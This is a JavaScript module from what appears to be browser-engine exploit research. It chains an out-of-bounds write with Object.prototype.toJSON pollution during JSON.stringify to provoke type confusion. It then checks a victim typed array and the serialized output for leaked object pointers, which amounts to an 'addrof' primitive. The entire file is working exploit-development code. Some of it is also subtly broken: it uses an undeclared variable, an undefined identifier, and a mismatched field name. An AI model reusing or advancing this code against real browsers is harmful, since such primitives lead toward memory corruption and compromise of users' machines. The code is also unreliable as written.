// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v20_ConfuseReturnedVictimContainer)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC = "OriginalHeisenbug_TypedArrayAddrof_v20_ConfuseReturnedVictimContainer";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v20 = null;
let object_to_leak_B_v20 = null;
let victim_typed_array_ref_v20 = null; 
let returned_container_v20 = null; // Objeto retornado pela Call #1 da sonda
let probe_call_count_v20 = 0;
let last_probe_details_v20 = null; // Para logging externo simplificado

function toJSON_TA_Probe_ConfuseReturnedVictimContainer() {
    probe_call_count_v20++;
    const call_num = probe_call_count_v20;
    let current_call_info = { call: call_num, this_type: Object.prototype.toString.call(this), action: "Init" };

    if (call_num === 1) {
        if (this === victim_typed_array_ref_v20) {
            current_call_info.action = "Returned container";
            logS3(`[CRVC_Probe_v20] Call #${call_num}: 'this' is victim. Returning new container.`, "info");
            returned_container_v20 = { 
                id_marker: "CRVC_Container_v20",
                victim_payload: victim_typed_array_ref_v20, 
                leak_slot_A: null, 
                leak_slot_B: null,
            };
            last_probe_details_v20 = current_call_info;
            return returned_container_v20;
        } else {
            current_call_info.action = "ERROR: Call 1 'this' not victim";
            logS3(`[CRVC_Probe_v20] Call #${call_num}: ERROR! 'this' is not victim_typed_array_ref_v20. Type: ${current_call_info.this_type}`, "error");
            last_probe_details_v20 = current_call_info;
            return { error_call_1_mismatch: true };
        }
    } else if (this === returned_container_v20) { 
        current_call_info.action = "Processing returned_container_v20";
        logS3(`[CRVC_Probe_v20] Call #${call_num}: 'this' IS returned_container_v20. Type: ${current_call_info.this_type}`, "info");
        
        if (current_call_info.this_type === '[object Object]') {
            current_call_info.action += " - Confused!";
            logS3(`[CRVC_Probe_v20] Call #${call_num}: TYPE CONFUSION ON returned_container_v20!`, "vuln");
            try {
                logS3(`   Attempting writes to this.victim_payload[0],[1] & this.leak_slot_A/B`, "warn");
                if (object_to_leak_A_v20) {
                    this.victim_payload[0] = object_to_leak_A_v20; // Tenta addrof na vítima real
                    this.leak_slot_A = object_to_leak_A_v20;         // Tenta vazar no próprio container
                }
                if (object_to_leak_B_v20) {
                    this.victim_payload[1] = object_to_leak_B_v20;
                    this.leak_slot_B = object_to_leak_B_v20;
                }
                current_call_info.action += " - Writes attempted";
                logS3(`[CRVC_Probe_v20] Call #${call_num}: Writes completed.`, "info");
            } catch(e_write) {
                current_call_info.action += ` - Write ERROR: ${e_write.message}`;
                logS3(`[CRVC_Probe_v20] Call #${call_num}: ERRO during writes: ${e_write.message}`, "error");
            }
        } else {
             current_call_info.action += " - Not [object Object]";
             logS3(`[CRVC_Probe_v20] Call #${call_num}: returned_container_v20 ('this') is NOT [object Object]. Type: ${current_call_info.this_type}`, "warn");
        }
        last_probe_details_v20 = current_call_info;
        return undefined; // Evitar mais processamento deste objeto pela sonda
    
    } else if (this === victim_typed_array_ref_v20 && call_num > 1) { // Pode ser chamado para serializar this.victim_payload
        current_call_info.action = "Processing victim_payload from container";
        logS3(`[CRVC_Probe_v20] Call #${call_num}: 'this' is victim_typed_array_ref_v20 (likely from victim_payload). Type: ${current_call_info.this_type}`, "info");
        // Se a vítima em si for confundida aqui, seria interessante.
        if (current_call_info.this_type === '[object Object]') {
             logS3(`[CRVC_Probe_v20] Call #${call_num}: VICTIM PAYLOAD ITSELF IS CONFUSED!`, "vuln");
             // Poderia tentar escritas aqui também se desejado
        }
        last_probe_details_v20 = current_call_info;
        return undefined; // Serializar Uint8Array normalmente se não confuso
    }
    else {
        current_call_info.action = "Unexpected 'this'";
        logS3(`[CRVC_Probe_v20] Call #${call_num}: Unexpected 'this'. Type: ${current_call_info.this_type}. IsVictim? ${this === victim_typed_array_ref_v20}. IsReturnedContainer? ${this === returned_container_v20}`, "warn");
        last_probe_details_v20 = current_call_details;
        return { unhandled_this_in_probe: true, call: call_num };
    }
}


export async function executeTypedArrayVictimAddrofTest_ConfuseReturnedVictimContainer() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ConfuseReturnedVictimContainer) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC} Init...`;

    probe_call_count_v20 = 0;
    victim_typed_array_ref_v20 = null; 
    controller_object_v20 = null; // Reset
    last_probe_details_v20 = null; // Reset
    object_to_leak_A_v20 = { marker: "ObjA_TA_v20crvc", id: Date.now() }; 
    object_to_leak_B_v20 = { marker: "ObjB_TA_v20crvc", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_obj = null; // Para o objeto parseado do stringifyOutput
    
    let addrof_Victim_A = { success: false, msg: "Addrof Victim[0]: Default" };
    let addrof_Victim_B = { success: false, msg: "Addrof Victim[1]: Default" };
    let addrof_Container_A = { success: false, msg: "Addrof Container.leak_slot_A: Default" };
    let addrof_Container_B = { success: false, msg: "Addrof Container.leak_slot_B: Default" };

    const fillPattern = 0.20202020202020;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v20 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v20.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) float64_view_on_underlying_ab[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v20 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ConfuseReturnedVictimContainer, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v20); 
            logS3(`  JSON.stringify completed. Raw Stringify Output (first 200 chars): ${rawStringifyOutput ? rawStringifyOutput.substring(0,200) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            try {
                if (rawStringifyOutput) stringifyOutput_obj = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}`, "warn");
                stringifyOutput_obj = { error_parsing_stringify_output: rawStringifyOutput };
            }

            logS3(`  Details of LAST probe call: ${last_probe_details_v20 ? JSON.stringify(last_probe_details_v20) : 'N/A (probe might not have been called as expected)'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmedOnContainer = false;
            if (last_probe_details_v20 && last_probe_details_v20.call_number > 1 && 
                last_probe_details_v20.this_type === "[object Object]" && 
                (last_probe_details_v20.action && last_probe_details_v20.action.includes("Processing returned_container_v20"))) {
                heisenbugConfirmedOnContainer = true;
                logS3(`  HEISENBUG ON RETURNED CONTAINER CONFIRMED! Last probe call details: ${JSON.stringify(last_probe_details_v20)}`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  ALERT: Heisenbug on returned container NOT confirmed. Last probe call details: ${last_probe_details_v20 ? JSON.stringify(last_probe_details_v20) : 'N/A'}`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking victim buffer for addrof...", "warn", FNAME_CURRENT_TEST);
            const val_A = float64_view_on_underlying_ab[0];
            let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_Victim_A.success = true; addrof_Victim_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_A_int64.toString(true)}`;
            } else { addrof_Victim_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A}`; }

            const val_B = float64_view_on_underlying_ab[1];
            // ... (similar for B)
            let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
            if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_Victim_B.success = true; addrof_Victim_B.msg = `Possible pointer for ObjB in victim_buffer[1]: ${temp_B_int64.toString(true)}`;
            } else { addrof_Victim_B.msg = `No pointer for ObjB in victim_buffer[1]. Val: ${val_B}`; }


            logS3("STEP 4: Checking parsed stringifyOutput_obj for leaked container slots...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_obj && stringifyOutput_obj.id_marker === "CRVC_Container_v20") {
                 const slot_A_val = stringifyOutput_obj.leak_slot_A;
                 if (typeof slot_A_val === 'number' && slot_A_val !==0) { // Check if it's a number (potential packed pointer)
                    let s_slotA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([slot_A_val]).buffer)[0], new Uint32Array(new Float64Array([slot_A_val]).buffer)[1]);
                    if (s_slotA_int64.high() < 0x00020000 || (s_slotA_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Container_A.success = true; addrof_Container_A.msg = `Possible pointer for leak_slot_A in stringifyOutput_obj: ${s_slotA_int64.toString(true)}`;
                    } else { addrof_Container_A.msg = `stringifyOutput_obj.leak_slot_A is number but not pointer-like: ${slot_A_val}`; }
                 } else { addrof_Container_A.msg = `stringifyOutput_obj.leak_slot_A not a number or zero. Value: ${slot_A_val}`; }

                 const slot_B_val = stringifyOutput_obj.leak_slot_B;
                 // ... (similar for slot_B_val)
                  if (typeof slot_B_val === 'number' && slot_B_val !==0) {
                    let s_slotB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([slot_B_val]).buffer)[0], new Uint32Array(new Float64Array([slot_B_val]).buffer)[1]);
                     if (s_slotB_int64.high() < 0x00020000 || (s_slotB_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Container_B.success = true; addrof_Container_B.msg = `Possible pointer for leak_slot_B in stringifyOutput_obj: ${s_slotB_int64.toString(true)}`;
                    } else { addrof_Container_B.msg = `stringifyOutput_obj.leak_slot_B is number but not pointer-like: ${slot_B_val}`; }
                 } else { addrof_Container_B.msg = `stringifyOutput_obj.leak_slot_B not a number or zero. Value: ${slot_B_val}`; }
            } else {
                addrof_Container_A.msg = "stringifyOutput_obj was not the expected container.";
                addrof_Container_B.msg = "stringifyOutput_obj was not the expected container.";
            }

            if (addrof_Victim_A.success || addrof_Victim_B.success || addrof_Container_A.success || addrof_Container_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}: Addr? SUCESSO!`;
            } else if (heisenbugConfirmedOnContainer) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}: Heisenbug Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_CRVC} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v20}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: Success=${addrof_Victim_A.success}, Msg='${addrof_Victim_A.msg}'`, addrof_Victim_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim B: Success=${addrof_Victim_B.success}, Msg='${addrof_Victim_B.msg}'`, addrof_Victim_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Container A: Success=${addrof_Container_A.success}, Msg='${addrof_Container_A.msg}'`, addrof_Container_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Container B: Success=${addrof_Container_B.success}, Msg='${addrof_Container_B.msg}'`, addrof_Container_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v20 = null; 
        controller_object_v20 = null;
        last_probe_details_v20 = null;
        probe_call_count_v20 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_obj, // Retorna o objeto parseado
        toJSON_details: last_probe_details_v20, 
        total_probe_calls: probe_call_count_v20,
        addrof_victim_A: addrof_Victim_A,
        addrof_victim_B: addrof_Victim_B,
        addrof_controller_A: addrof_Container_A,
        addrof_controller_B: addrof_Container_B
    };
}
